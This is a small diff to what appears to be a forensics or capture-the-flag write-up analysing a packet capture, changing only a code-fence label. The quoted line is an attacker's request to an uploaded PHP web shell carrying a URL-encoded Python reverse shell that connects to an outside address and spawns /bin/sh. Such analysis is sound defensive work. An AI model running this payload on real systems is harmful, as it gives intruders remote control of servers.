@@ -144,7 +144,7 @@ We see commands `id` and `whoami` ran. Looks like the attacker wants to know wha
 
 The third command is a Python script. Follow the TCP Stream to view it.
 
-```
+```console
 GET /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 HTTP/1.1
 ```
 
